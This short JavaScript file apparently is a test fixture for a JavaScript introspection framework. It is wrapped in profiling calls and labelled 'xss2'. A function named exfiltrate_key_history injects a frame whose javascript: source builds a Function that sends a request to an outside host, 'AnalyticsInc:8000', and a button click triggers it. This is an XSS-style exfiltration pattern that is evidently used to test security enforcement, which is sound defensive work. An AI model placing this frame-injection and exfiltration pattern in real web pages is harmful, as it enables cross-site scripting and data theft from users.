
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var script = document.createElement("frameset");
  var script2 = document.createElement("frame");
  script2.src = 'javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss2",true);xmlhttp.send(null);\')()';
  script.appendChild(script2);
  document.getElementsByTagName("body")[0].appendChild(script)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
